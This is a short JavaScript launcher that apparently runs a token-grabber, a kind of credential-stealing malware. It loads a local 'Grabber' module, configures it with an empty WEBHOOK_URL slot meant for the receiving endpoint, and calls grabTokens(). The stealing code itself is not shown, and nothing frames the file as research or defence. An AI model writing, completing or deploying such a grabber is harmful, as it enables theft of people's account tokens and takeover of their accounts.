const Grabber = require('./Grabber');
const grabber = new Grabber({
    WEBHOOK_URL: '',
    ping: false
});

grabber.grabTokens();